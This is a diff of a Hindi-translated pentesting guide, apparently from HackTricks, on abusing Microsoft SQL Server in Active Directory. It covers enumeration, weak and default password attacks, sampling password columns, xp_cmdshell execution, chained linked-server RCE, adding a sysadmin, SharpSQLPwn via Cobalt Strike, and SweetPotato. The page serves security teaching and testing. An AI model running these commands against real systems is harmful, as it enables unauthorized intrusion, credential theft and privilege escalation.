@@ -7,7 +7,7 @@
 
 ### Python
 
-[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) टूल impacket पर आधारित है, और यह kerberos टिकट का उपयोग करके प्रमाणीकरण करने और लिंक श्रृंखलाओं के माध्यम से हमले की अनुमति देता है।
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) उपकरण impacket पर आधारित है, और यह kerberos टिकट का उपयोग करके प्रमाणित करने की अनुमति देता है, और लिंक श्रृंखलाओं के माध्यम से हमले करता है।
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -90,12 +90,12 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ---
 ###  Powershell
 
-इस मामले में powershell मॉड्यूल [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) बहुत उपयोगी है।
-```powershell
+यहाँ पर powershell मॉड्यूल [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) बहुत उपयोगी है।
+```bash
 Import-Module .\PowerupSQL.psd1
 ````
-### नेटवर्क से डोमेन सत्र के बिना एन्यूमरेट करना
-```powershell
+### नेटवर्क से डोमेन सत्र के बिना एन्यूमरेटिंग
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -109,7 +109,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
 ### डोमेन के अंदर से एन्यूमरेट करना
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -117,6 +117,12 @@ Get-SQLInstanceLocal | Get-SQLServerInfo
 #Get info about valid MSQL instances running in domain
 #This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
 Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+
+# Try dictionary attack to login
+Invoke-SQLAuditWeakLoginPw
+
+# Search SPNs of common software and try the default creds
+Get-SQLServerDefaultLoginPw
 
 #Test connections with each one
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
@@ -127,14 +133,26 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL बेसिक दुरुपयोग
+## MSSQL Basic Abuse
 
-### एक्सेस DB
-```powershell
+### Access DB
+```bash
+# List databases
+Get-SQLInstanceDomain | Get-SQLDatabase
+
+# List tables in a DB you can read
+Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName
+
+# List columns in a table
+Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName
+
+# Get some sample data from a column in a table (columns username & passwor din the example)
+Get-SQLInstanceDomain | GetSQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10
+
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
 
-#Dump an instance (a lotof CVSs generated in current dir)
+#Dump an instance (a lot of CVSs generated in current dir)
 Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 
 # Search keywords in columns trying to access the MSSQL DBs
@@ -144,11 +162,11 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ### MSSQL RCE
 
 यह MSSQL होस्ट के अंदर **कमांड्स** को निष्पादित करना भी संभव हो सकता है।
-```powershell
+```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-**निम्नलिखित अनुभाग में देखें कि इसे मैन्युअल रूप से कैसे करना है।**
+**निम्नलिखित अनुभाग में मैन्युअल रूप से यह कैसे करना है, यह जांचें।**
 
 ### MSSQL बुनियादी हैकिंग ट्रिक्स
 
@@ -156,14 +174,14 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
 {{#endref}}
 
-## MSSQL विश्वसनीय लिंक
+## MSSQL ट्रस्टेड लिंक
 
-यदि एक MSSQL उदाहरण को एक अलग MSSQL उदाहरण द्वारा विश्वसनीय (डेटाबेस लिंक) माना जाता है। यदि उपयोगकर्ता के पास विश्वसनीय डेटाबेस पर विशेषाधिकार हैं, तो वह **अन्य उदाहरण में क्वेरी निष्पादित करने के लिए विश्वास संबंध का उपयोग कर सकेगा**। ये विश्वास श्रृंखलाबद्ध किए जा सकते हैं और किसी बिंदु पर उपयोगकर्ता कुछ गलत कॉन्फ़िगर किए गए डेटाबेस को खोजने में सक्षम हो सकता है जहाँ वह कमांड निष्पादित कर सकता है।
+यदि एक MSSQL उदाहरण को एक अलग MSSQL उदाहरण द्वारा ट्रस्ट किया गया है (डेटाबेस लिंक)। यदि उपयोगकर्ता के पास ट्रस्टेड डेटाबेस पर विशेषाधिकार हैं, तो वह **अन्य उदाहरण में क्वेरी निष्पादित करने के लिए ट्रस्ट संबंध का उपयोग करने में सक्षम होगा**। ये ट्रस्ट चेन किए जा सकते हैं और किसी बिंदु पर उपयोगकर्ता कुछ गलत कॉन्फ़िगर किए गए डेटाबेस को खोजने में सक्षम हो सकता है जहाँ वह कमांड निष्पादित कर सकता है।
 
 **डेटाबेस के बीच के लिंक वन ट्रस्ट के पार भी काम करते हैं।**
 
 ### पॉवरशेल दुरुपयोग
-```powershell
+```bash
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
 
@@ -194,9 +212,15 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
+एक और समान उपकरण जो उपयोग किया जा सकता है वह है [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
+```bash
+SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+# Cobalt Strike
+inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+```
 ### Metasploit
 
-आप मेटास्प्लॉइट का उपयोग करके आसानी से विश्वसनीय लिंक की जांच कर सकते हैं।
+आप आसानी से metasploit का उपयोग करके विश्वसनीय लिंक की जांच कर सकते हैं।
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
@@ -221,18 +245,18 @@ EXEC sp_linkedservers;
 ```
 ![](<../../images/image (716).png>)
 
-#### विश्वसनीय लिंक में क्वेरी निष्पादित करें
+#### भरोसेमंद लिंक में क्वेरी निष्पादित करें
 
 लिंक के माध्यम से क्वेरी निष्पादित करें (उदाहरण: नए सुलभ उदाहरण में अधिक लिंक खोजें):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> जांचें कि डबल और सिंगल कोट्स कहाँ उपयोग किए गए हैं, उन्हें इस तरह से उपयोग करना महत्वपूर्ण है।
+> यह जांचें कि डबल और सिंगल कोट्स कहाँ उपयोग किए गए हैं, उन्हें इस तरह से उपयोग करना महत्वपूर्ण है।
 
 ![](<../../images/image (643).png>)
 
-आप इन विश्वसनीय लिंक श्रृंखला को मैन्युअल रूप से हमेशा के लिए जारी रख सकते हैं।
+आप इन विश्वसनीय लिंक श्रृंखलाओं को मैन्युअल रूप से हमेशा के लिए जारी रख सकते हैं।
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -254,8 +278,8 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **MSSQL स्थानीय उपयोगकर्ता** के पास आमतौर पर एक विशेष प्रकार का विशेषाधिकार होता है जिसे **`SeImpersonatePrivilege`** कहा जाता है। यह खाता "प्रमाणीकरण के बाद एक ग्राहक का अनुकरण" करने की अनुमति देता है।
 
-कई लेखकों द्वारा विकसित एक रणनीति यह है कि एक SYSTEM सेवा को एक धोखाधड़ी या मैन-इन-द-मिडल सेवा के लिए प्रमाणीकरण करने के लिए मजबूर किया जाए जिसे हमलावर बनाता है। यह धोखाधड़ी सेवा तब SYSTEM सेवा का अनुकरण करने में सक्षम होती है जबकि यह प्रमाणीकरण करने की कोशिश कर रही होती है।
+एक रणनीति जो कई लेखकों ने विकसित की है, वह है एक SYSTEM सेवा को एक धोखाधड़ी या मैन-इन-द-मिडल सेवा के लिए प्रमाणीकरण करने के लिए मजबूर करना जिसे हमलावर बनाता है। यह धोखाधड़ी सेवा तब SYSTEM सेवा का अनुकरण कर सकती है जबकि यह प्रमाणीकरण करने की कोशिश कर रही है।
 
-[SweetPotato](https://github.com/CCob/SweetPotato) के पास इन विभिन्न तकनीकों का एक संग्रह है जिसे Beacon के `execute-assembly` कमांड के माध्यम से निष्पादित किया जा सकता है। 
+[SweetPotato](https://github.com/CCob/SweetPotato) के पास इन विभिन्न तकनीकों का एक संग्रह है जिसे Beacon के `execute-assembly` कमांड के माध्यम से निष्पादित किया जा सकता है।
 
 {{#include ../../banners/hacktricks-training.md}}
